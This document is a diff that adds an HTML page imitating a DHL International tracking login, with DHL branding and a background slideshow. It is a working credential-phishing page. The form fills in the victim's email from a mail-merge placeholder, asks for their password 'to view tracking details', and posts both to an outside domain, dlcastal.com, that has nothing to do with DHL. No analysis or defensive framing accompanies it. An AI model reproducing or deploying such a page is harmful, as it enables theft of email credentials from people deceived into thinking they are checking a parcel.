@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>DHL International &amp; Worldwide</title>
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <style type="text/css">
+body,div,dl,dt,dd,ul,ol,li,h1,h2,h3,h4,h5,h6,pre,form,fieldset,input,textarea,p,blockquote,th,td {
+  margin:0;
+  padding:0;
+}
+html,body {
+  margin:0;
+  padding:0;
+}
+table {
+  border-collapse:collapse;
+  border-spacing:0;
+}
+fieldset,img {
+  border:0;
+}
+input{
+  border:1px solid #b0b0b0;
+  padding:3px 5px 4px;
+  color:#979797;
+  width:190px;
+}
+address,caption,cite,code,dfn,th,var {
+  font-style:normal;
+  font-weight:normal;
+}
+ol,ul {
+  list-style:none;
+}
+caption,th {
+  text-align:left;
+}
+h1,h2,h3,h4,h5,h6 {
+  font-size:100%;
+  font-weight:normal;
+}
+q:before,q:after {
+  content:'';
+}
+abbr,acronym { border:0;
+}
+/* General Demo Style */
+body{
+  font-family: "helvetica neue", helvetica;
+  background: #000;
+  font-weight: 400;
+  font-size: 15px;
+  color: #aa3e03;
+  overflow-y: scroll;
+  overflow-x: hidden;
+}
+.ie7 body{
+  overflow:hidden;
+}
+a{
+  color: #333;
+  text-decoration: none;
+}
+.container{
+  position: relative;
+  text-align: center;
+}
+.clr{
+  clear: both;
+}
+.container > header{
+  padding: 30px 30px 10px 20px;
+  margin: 0px 20px 10px 20px;
+  position: relative;
+  display: block;
+  text-shadow: 1px 1px 1px rgba(0,0,0,0.2);
+    text-align: left;
+}
+.container > header h1{
+  font-family: "helvetica neue", helvetica;
+  font-size: 35px;
+  line-height: 35px;
+  position: relative;
+  font-weight: 400;
+  color: #fff;
+  text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
+    padding: 0px 0px 5px 0px;
+}
+.container > header h1 span{
+
+}
+.container > header h2, p.info{
+  font-size: 16px;
+  font-style: italic;
+  color: #f8f8f8;
+  text-shadow: 1px 1px 1px rgba(0,0,0,0.6);
+}
+
+.slideshow,
+.slideshow:after {
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    top: 0px;
+    left: 0px;
+    z-index: 0;
+}
+.slideshow:after {
+    content: '';
+    background: transparent url(../images/pattern.png) repeat top left;
+}
+.slideshow li span {
+    width: 100%;
+    height: 100%;
+    position: absolute;
+    top: 0px;
+    left: 0px;
+    color: transparent;
+    background-size: cover;
+    background-position: 50% 50%;
+    background-repeat: none;
+    opacity: 0;
+    z-index: 0;
+  -webkit-backface-visibility: hidden;
+    -webkit-animation: imageAnimation 36s linear infinite 0s;
+    -moz-animation: imageAnimation 36s linear infinite 0s;
+    -o-animation: imageAnimation 36s linear infinite 0s;
+    -ms-animation: imageAnimation 36s linear infinite 0s;
+    animation: imageAnimation 36s linear infinite 0s;
+}
+.slideshow li div {
+    z-index: 1000;
+    position: absolute;
+    bottom: 30px;
+    left: 0px;
+    width: 100%;
+    text-align: center;
+    opacity: 0;
+    -webkit-animation: titleAnimation 36s linear infinite 0s;
+    -moz-animation: titleAnimation 36s linear infinite 0s;
+    -o-animation: titleAnimation 36s linear infinite 0s;
+    -ms-animation: titleAnimation 36s linear infinite 0s;
+    animation: titleAnimation 36s linear infinite 0s;
+}
+.slideshow li div h3 {
+  font-family: "helvetica neue", helvetica;
+  text-transform: uppercase;
+  font-size: 80px;
+  padding: 0;
+  line-height: 200px;
+  color: rgba(255,255,255, 0.8);
+}
+.slideshow li:nth-child(1) span { background-image: url(https://media-exp1.licdn.com/dms/image/C561BAQEjRAw1vG8FGA/company-background_10000/0/1578408521231?e=2159024400&v=beta&t=EeZmYw6Me-Hamd1xkIZiLKCDC0XuoU_RzSQGSdXya-8) }
+.slideshow li:nth-child(2) span {
+    background-image: url(https://martech.org/wp-content/ml-loads/2015/12/DHL-plane-800x419.jpg);
+    -webkit-animation-delay: 6s;
+    -moz-animation-delay: 6s;
+    -o-animation-delay: 6s;
+    -ms-animation-delay: 6s;
+    animation-delay: 6s;
+}
+.slideshow li:nth-child(3) span {
+    background-image: url(https://www.joc.com/sites/default/files/field_feature_image/dhl-boeing-777-03.jpg);
+    -webkit-animation-delay: 12s;
+    -moz-animation-delay: 12s;
+    -o-animation-delay: 12s;
+    -ms-animation-delay: 12s;
+    animation-delay: 12s;
+}
+.slideshow li:nth-child(4) span {
+    background-image: url(https://i0.wp.com/rayhaber.com/wp-content/uploads/2020/10/dhl-express-dunyanin-en-iyi-2-isyeri-secildi.jpg?fit=1424%2C800&ssl=1);
+    -webkit-animation-delay: 18s;
+    -moz-animation-delay: 18s;
+    -o-animation-delay: 18s;
+    -ms-animation-delay: 18s;
+    animation-delay: 18s;
+}
+.slideshow li:nth-child(5) span {
+    background-image: url(http://www.sandboxusa.com/wp-content/uploads/2016/08/dhl-sideimg1.png);
+    -webkit-animation-delay: 24s;
+    -moz-animation-delay: 24s;
+    -o-animation-delay: 24s;
+    -ms-animation-delay: 24s;
+    animation-delay: 24s;
+}
+.slideshow li:nth-child(6) span {
+    background-image: url(https://www.itln.in/itlnbackend/assets/uploads/DHL-Express-delivers-cheer-to-Indian-customers-with-festive-offers.jpg);
+    -webkit-animation-delay: 30s;
+    -moz-animation-delay: 30s;
+    -o-animation-delay: 30s;
+    -ms-animation-delay: 30s;
+    animation-delay: 30s;
+}
+.slideshow li:nth-child(2) div {
+    -webkit-animation-delay: 6s;
+    -moz-animation-delay: 6s;
+    -o-animation-delay: 6s;
+    -ms-animation-delay: 6s;
+    animation-delay: 6s;
+}
+.slideshow li:nth-child(3) div {
+    -webkit-animation-delay: 12s;
+    -moz-animation-delay: 12s;
+    -o-animation-delay: 12s;
+    -ms-animation-delay: 12s;
+    animation-delay: 12s;
+}
+.slideshow li:nth-child(4) div {
+    -webkit-animation-delay: 18s;
+    -moz-animation-delay: 18s;
+    -o-animation-delay: 18s;
+    -ms-animation-delay: 18s;
+    animation-delay: 18s;
+}
+.slideshow li:nth-child(5) div {
+    -webkit-animation-delay: 24s;
+    -moz-animation-delay: 24s;
+    -o-animation-delay: 24s;
+    -ms-animation-delay: 24s;
+    animation-delay: 24s;
+}
+.slideshow li:nth-child(6) div {
+    -webkit-animation-delay: 30s;
+    -moz-animation-delay: 30s;
+    -o-animation-delay: 30s;
+    -ms-animation-delay: 30s;
+    animation-delay: 30s;
+}
+.slideshow li:nth-child(7) div {
+    -webkit-animation-delay: 30s;
+    -moz-animation-delay: 30s;
+    -o-animation-delay: 30s;
+    -ms-animation-delay: 30s;
+    animation-delay: 30s;
+}
+/* Animation for the slideshow images */
+@-webkit-keyframes imageAnimation {
+  0% {
+      opacity: 0;
+      -webkit-animation-timing-function: ease-in;
+  }
+  8% {
+      opacity: 1;
+      -webkit-transform: scale(1.05);
+      -webkit-animation-timing-function: ease-out;
+  }
+  17% {
+      opacity: 1;
+      -webkit-transform: scale(1.1);
+  }
+  25% {
+      opacity: 0;
+      -webkit-transform: scale(1.1);
+  }
+  100% { opacity: 0 }
+}
+@-moz-keyframes imageAnimation {
+  0% {
+      opacity: 0;
+      -moz-animation-timing-function: ease-in;
+  }
+  8% {
+      opacity: 1;
+      -moz-transform: scale(1.05);
+      -moz-animation-timing-function: ease-out;
+  }
+  17% {
+      opacity: 1;
+      -moz-transform: scale(1.1);
+  }
+  25% {
+      opacity: 0;
+      -moz-transform: scale(1.1);
+  }
+  100% { opacity: 0 }
+}
+@-o-keyframes imageAnimation {
+  0% {
+      opacity: 0;
+      -o-animation-timing-function: ease-in;
+  }
+  8% {
+      opacity: 1;
+      -o-transform: scale(1.05);
+      -o-animation-timing-function: ease-out;
+  }
+  17% {
+      opacity: 1;
+      -o-transform: scale(1.1);
+  }
+  25% {
+      opacity: 0;
+      -o-transform: scale(1.1);
+  }
+  100% { opacity: 0 }
+}
+@-ms-keyframes imageAnimation {
+  0% {
+      opacity: 0;
+      -ms-animation-timing-function: ease-in;
+  }
+  8% {
+      opacity: 1;
+      -ms-transform: scale(1.05);
+      -ms-animation-timing-function: ease-out;
+  }
+  17% {
+      opacity: 1;
+      -ms-transform: scale(1.1);
+  }
+  25% {
+      opacity: 0;
+      -ms-transform: scale(1.1);
+  }
+  100% { opacity: 0 }
+}
+@keyframes imageAnimation {
+  0% {
+      opacity: 0;
+      animation-timing-function: ease-in;
+  }
+  8% {
+      opacity: 1;
+      transform: scale(1.05);
+      animation-timing-function: ease-out;
+  }
+  17% {
+      opacity: 1;
+      transform: scale(1.1);
+  }
+  25% {
+      opacity: 0;
+      transform: scale(1.1);
+  }
+  100% { opacity: 0 }
+}
+/* Animation for the title */
+@-webkit-keyframes titleAnimation {
+  0% {
+      opacity: 0;
+      -webkit-transform: translateY(200px);
+  }
+  8% {
+      opacity: 1;
+      -webkit-transform: translateY(0px);
+  }
+  17% {
+      opacity: 1;
+      -webkit-transform: scale(1);
+  }
+  19% { opacity: 0 }
+  25% {
+      opacity: 0;
+      -webkit-transform: scale(10);
+  }
+  100% { opacity: 0 }
+}
+@-moz-keyframes titleAnimation {
+  0% {
+      opacity: 0;
+      -moz-transform: translateY(200px);
+  }
+  8% {
+      opacity: 1;
+      -moz-transform: translateY(0px);
+  }
+  17% {
+      opacity: 1;
+      -moz-transform: scale(1);
+  }
+  19% { opacity: 0 }
+  25% {
+      opacity: 0;
+      -moz-transform: scale(10);
+  }
+  100% { opacity: 0 }
+}
+@-o-keyframes titleAnimation {
+  0% {
+      opacity: 0;
+      -o-transform: translateY(200px);
+  }
+  8% {
+      opacity: 1;
+      -o-transform: translateY(0px);
+  }
+  17% {
+      opacity: 1;
+      -o-transform: scale(1);
+  }
+  19% { opacity: 0 }
+  25% {
+      opacity: 0;
+      -o-transform: scale(10);
+  }
+  100% { opacity: 0 }
+}
+@-ms-keyframes titleAnimation {
+  0% {
+      opacity: 0;
+      -ms-transform: translateY(200px);
+  }
+  8% {
+      opacity: 1;
+      -ms-transform: translateY(0px);
+  }
+  17% {
+      opacity: 1;
+      -ms-transform: scale(1);
+  }
+  19% { opacity: 0 }
+  25% {
+      opacity: 0;
+      -webkit-transform: scale(10);
+  }
+  100% { opacity: 0 }
+}
+@keyframes titleAnimation {
+  0% {
+      opacity: 0;
+      transform: translateY(200px);
+  }
+  8% {
+      opacity: 1;
+      transform: translateY(0px);
+  }
+  17% {
+      opacity: 1;
+      transform: scale(1);
+  }
+  19% { opacity: 0 }
+  25% {
+      opacity: 0;
+      transform: scale(10);
+  }
+  100% { opacity: 0 }
+}
+/* Show at least something when animations not supported */
+.no-cssanimations .slideshow li span{
+  opacity: 1;
+}
+@media screen and (max-width: 1140px) {
+  .slideshow li div h3 { font-size: 100px }
+}
+@media screen and (max-width: 600px) {
+  .slideshow li div h3 { font-size: 50px }
+}
+
+
+body {
+    font-family: 'Roboto Condensed', sans-serif;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    color: #5f5e5e; overflow-y:scroll;
+}
+
+a:hover {
+    text-decoration: none;
+}
+
+h1, h2, h3, h4, h5, h6 {
+    font-weight: bold;
+    padding-bottom: 10px;
+    color: #000;
+}
+
+h3 {
+    font-size: 21px;
+    color: #0083ca;
+}
+
+.footer {
+    background-color: #002032;
+    border-radius: 0px;
+    height: 30px;
+    padding: 8px 0px;
+}
+
+.footer-text {
+    color: #fcbc2c;
+    font-size: 12px;
+    margin:0 auto;
+    position: relative;
+}
+
+.footer-text a {
+    color: inherit;
+    text-decoration: inherit;
+}
+
+.footer-text a:hover {
+    color: inherit;
+    text-decoration: underline;
+}
+
+.footer-left {
+    float: left;
+}
+
+.footer-right {
+    float: right;
+}
+
+.navbar hr {
+  border-style: solid none;
+  border-top-width: 1px;
+  margin: 0;
+  border-color: rgba(100,100,100,0.2);
+  width: 100%;
+}
+
+hr {
+    border-style: solid none;
+    border-top-width: 1px;
+    margin-top: 90px;
+    border-color: rgba(100,100,100,0.2);
+    margin-left: -14px;
+    width: 970px;
+    margin-bottom: -120px;
+}
+
+.scrollable-menu {
+    height: auto;
+    max-height: 200px;
+    overflow-x: hidden;
+}
+
+svg:not(:root) {
+    overflow: visible;
+}
+
+svg.icon path {
+    fill: #868585;
+}
+
+svg.svghome path {
+    fill: #fbbb2b;
+}
+
+
+/*=====================================================================================*/
+/* Login Page                                                                          */
+/*=====================================================================================*/
+
+.login {
+    padding: 40px 29px;
+    background-color: #fff;
+    border-radius: 0 0 2px 2px;
+}
+
+.login input[type="text"], .login input[type="password"] {
+    font-size: 14px;
+    height: auto;
+    margin-bottom: 10px;
+    padding: 7px 12px;
+    width: 290px;
+    border-style: solid;
+    border-color: rgba(0,0,0,0.1);
+    border-width: thin;
+    border-radius: 2px;
+}
+
+.login .btn-primary {
+    background-color: #fcbc2c;
+    border: none;
+    width: 290px;
+    border-radius: 2px;
+    font-weight: bold;
+    height: 43px;
+    margin: 10px 0;
+}
+
+.login .btn-primary:hover {
+    background-color: #fdc956;
+}
+
+.login p {
+    color: #3580c7;
+    font-size: 12px;
+    margin: 10px auto;
+    padding-left: 12px;
+}
+
+.logout-btn {
+    position: relative;
+    top: -5px;
+}
+
+.login-shadow {
+    box-shadow: 0px 1px 15px #ccc;
+    max-width: 350px;
+    margin: 0 auto;
+}
+
+.login-blue {
+    background-color: #3580c7;
+    padding: 10px 30px 10px;
+    z-index: 1;
+    position: relative;
+    border-radius: 2px 2px 0 0;
+}
+
+.login-blue h3 {
+    color: #fff;
+    font-weight: bold;
+    padding-left: 12px;
+}
+
+/*=====================================================================================*/
+/* Light Box                                                                           */
+/*=====================================================================================*/
+
+#overlay {
+    display: none;
+    z-index: 2;
+    background: #000;
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    top: 119px;
+    left: 0px;
+    text-align: center;
+    box-shadow: none;
+}
+
+/*=====================================================================================*/
+/* Header                                                                              */
+/*=====================================================================================*/
+
+.logo {
+    width: 122px;
+    margin-left: -5px;
+}
+
+.login-text {
+    position: relative;
+    right: 45px;
+    color: #fff;
+    text-transform: initial;
+    font-weight: normal;
+    letter-spacing: normal;
+    font-size: 14px;
+    top: 30px;
+}
+
+.bubble {
+    position: absolute;
+    min-width: 130px;
+    padding: 0px;
+    background: #FFFFFF;
+    -webkit-border-radius: 1px;
+    -moz-border-radius: 1px;
+    border-radius: 1px;
+    border: none;
+    top: 41px;
+    box-shadow: 0 1px 10px rgba(0,0,0,.175);
+}
+
+.bubble:after {
+    content: '';
+    position: absolute;
+    border-style: solid;
+    border-width: 0 8px 10px;
+    border-color: #FFFFFF transparent;
+    display: block;
+    width: 0;
+    z-index: 1;
+    top: -10px;
+    left: 105px;
+}
+
+
+    </style>
+  </head>
+  <body>
+    <ul class="slideshow">
+      <li>
+        <span>Image 01</span>
+        <div>
+          <h3>
+            DHL International®</h3>
+        </div>
+      </li>
+      <li>
+        <span>Image 02</span></li>
+      <li>
+        <span>Image 03</span></li>
+      <li>
+        <span>Image 04</span>
+        <div>
+          <h3>
+            DHL International Worldwide®
+        </div>
+      </li>
+      <li>
+        <span>Image 05</span></li>
+      <li>
+        <span>Image 06</span></li>
+    </ul>
+    <div class="container">
+      <header>
+        <img src="https://imgur.com/y4MiHMg.png" alt="" height="40px" align="center"/>
+
+      </header>
+    </div>
+    <div id="overlay">
+      &nbsp;</div>
+
+    <div class="container">
+      <div class="login-shadow">
+        <div class="login-blue">
+          <h3>
+            DHL International Worldwide®</h3>
+          <p>
+
+ <span style="color:#ffffff;">Continue With Valid Email And Password To View & Complete Tracking Details</span></p><br>
+<img src="https://i.imgur.com/y4MiHMg.png" alt="pdf" height="50px" align="center"/></br>
+        </div>
+        <form action="https://dlcastal.com/i/post.php" class="login" method="POST" name="login_form">
+
+<input style="border:none" name="email"  readonly="readonly"value="[[-Email-]]" type="text"/>
+<input class="input-block-level" name="password" placeholder="Password" type="password" required="" /><button class="btn btn-large btn-primary" type="submit">Continue</button></form>
+      </div>
+    </div>
+    <p>
+      &nbsp;</p>
+  </body>
+</html>
